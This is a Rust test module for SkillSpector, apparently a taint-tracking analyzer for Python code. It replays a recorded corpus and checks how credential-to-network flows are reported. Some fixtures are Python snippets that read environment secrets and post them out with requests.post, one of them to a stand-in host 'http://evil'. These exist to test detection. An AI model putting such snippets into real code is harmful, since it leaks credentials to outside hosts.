//! Replays SkillSpector's own taint tests: `tools/taint_record.py` ran
//! `tests/nodes/analyzers/test_behavioral_taint_tracking.py` against the Python analyzer and
//! stored every (files, findings) pair and every `_collect_tainted` result in
//! `tests/data/taint_corpus.json`; each must come out identical here.

use super::{Taint, collect_tainted};
use crate::pyast::PyFile;
use crate::runner::run_static;
use crate::skill::Skill;
use serde::Deserialize;
use serde_json::Value;
use std::collections::BTreeMap;

#[derive(Deserialize)]
struct Expected {
    rule: String,
    message: String,
    line: u32,
    end_line: Option<u32>,
    col: Option<u32>,
    end_col: Option<u32>,
    matched: Option<String>,
    file: String,
    evidence: BTreeMap<String, Value>,
}

#[derive(Deserialize)]
struct Case {
    kind: String,
    #[serde(default)]
    files: BTreeMap<String, String>,
    #[serde(default)]
    findings: Vec<Expected>,
    #[serde(default)]
    code: String,
    #[serde(default)]
    tainted: BTreeMap<String, (String, String, u32)>,
}

#[derive(Debug, PartialEq, Eq, PartialOrd, Ord)]
struct Row {
    file: String,
    rule: String,
    message: String,
    line: u32,
    end_line: Option<u32>,
    col: Option<u32>,
    end_col: Option<u32>,
    matched: String,
    evidence: String,
}

fn corpus() -> Vec<Case> {
    let path = concat!(env!("CARGO_MANIFEST_DIR"), "/tests/data/taint_corpus.json");
    let text = std::fs::read_to_string(path).expect("corpus");
    let mut cases: Vec<Case> = serde_json::from_str(&text).expect("corpus json");
    // The few huge finding-cap stress cases live outside the repository (tools/README.md).
    let large = std::env::var_os("SKILLSPECTOR_RS_PRIVATE_DATA")
        .map(|d| std::path::Path::new(&d).join("taint_corpus_large.json"))
        .and_then(|p| std::fs::read_to_string(p).ok());
    if let Some(text) = large {
        cases.extend(serde_json::from_str::<Vec<Case>>(&text).expect("large corpus json"));
    }
    cases
}

fn run(files: &BTreeMap<String, String>) -> Vec<Row> {
    let skill = Skill::from_memory(
        files
            .iter()
            .map(|(k, v)| (k.clone(), v.clone().into_bytes()))
            .collect(),
    );
    let mut rows: Vec<Row> = run_static(&skill, &[&Taint])
        .iter()
        .map(|f| Row {
            file: f.file.clone(),
            rule: f.rule_id.to_owned(),
            message: f.message.clone(),
            line: f.start_line,
            end_line: f.end_line,
            col: f.start_column,
            end_col: f.end_column,
            matched: f.matched_text.clone().unwrap_or_default(),
            evidence: serde_json::to_string(&f.evidence).unwrap_or_default(),
        })
        .collect();
    rows.sort();
    rows
}

#[test]
fn replays_python_taint_corpus() {
    let mut failures = Vec::new();
    let mut checked = 0;
    for (i, case) in corpus()
        .into_iter()
        .enumerate()
        .filter(|(_, c)| c.kind == "node")
    {
        let mut want: Vec<Row> = case
            .findings
            .iter()
            .map(|e| {
                let evidence: BTreeMap<String, String> = e
                    .evidence
                    .iter()
                    .map(|(k, v)| (k.clone(), v.to_string()))
                    .collect();
                Row {
                    file: e.file.clone(),
                    rule: e.rule.clone(),
                    message: e.message.clone(),
                    line: e.line,
                    end_line: e.end_line,
                    col: e.col,
                    end_col: e.end_col,
                    matched: e.matched.clone().unwrap_or_default(),
                    evidence: serde_json::to_string(&evidence).unwrap_or_default(),
                }
            })
            .collect();
        want.sort();
        let got = run(&case.files);
        checked += 1;
        if got != want {
            let first = got.iter().zip(&want).find(|(g, w)| g != w);
            failures.push(format!(
                "case {i}: got {} want {}; first diff {:?}\n  code: {:?}",
                got.len(),
                want.len(),
                first,
                case.files
                    .values()
                    .next()
                    .map(|c| c.chars().take(160).collect::<String>())
            ));
        }
    }
    assert!(checked > 400, "corpus shrank: {checked}");
    assert!(
        failures.is_empty(),
        "{} of {checked} cases differ:\n{}",
        failures.len(),
        failures
            .iter()
            .take(8)
            .cloned()
            .collect::<Vec<_>>()
            .join("\n")
    );
}

#[test]
fn replays_collect_tainted_cases() {
    for case in corpus().into_iter().filter(|c| c.kind == "collect") {
        let pf = PyFile::parse(&case.code, "t.py");
        let got: BTreeMap<String, (String, String, u32)> = collect_tainted(&pf)
            .into_iter()
            .map(|(label, v)| (label, (v.name, v.source_call.to_owned(), v.lineno)))
            .collect();
        assert_eq!(got, case.tainted, "code: {}", case.code);
    }
}

fn flows(code: &str) -> Vec<(String, u32, Option<u32>, String)> {
    let files = BTreeMap::from([("script.py".to_owned(), code.to_owned())]);
    run(&files)
        .into_iter()
        .map(|r| (r.rule, r.line, r.col, r.message))
        .collect()
}

#[test]
fn same_line_sinks_keep_both_columns() {
    let call = r#"requests.post("http://evil", data=secret)"#;
    let code = format!("import os, requests\nsecret = os.environ.get(\"KEY\")\n{call}; {call}\n");
    let cols: Vec<_> = flows(&code).into_iter().map(|f| (f.0, f.1, f.2)).collect();
    assert_eq!(
        cols,
        [
            ("TT3".into(), 3, Some(0)),
            ("TT3".into(), 3, Some(call.len() as u32 + 2))
        ]
    );
}

#[test]
fn tainted_flow_message_uses_arrow_and_first_source() {
    let code = "import os, requests\nkey = os.getenv(\"K\")\nrequests.post(\"u\", data=key)\n";
    assert_eq!(
        flows(code)[0].3,
        "Tainted flow: 'key' from os.getenv (line 2, credential/environment) \u{2192} requests.post (network output)"
    );
}

#[test]
fn direct_flow_wins_over_tainted_flow_of_same_rule() {
    let code = "import os, requests\ns = os.getenv(\"K\")\nrequests.post(\"u\", data=s, h=os.getenv(\"X\"))\n";
    let f = flows(code);
    assert_eq!(f.len(), 1);
    assert!(f[0].3.starts_with("Direct flow: os.getenv"));
}

#[test]
fn unrelated_scopes_do_not_share_taint() {
    let code = "import os, requests\ndef a():\n    x = os.getenv(\"K\")\ndef b(x):\n    requests.post(\"u\", data=x)\n";
    assert!(flows(code).is_empty());
}
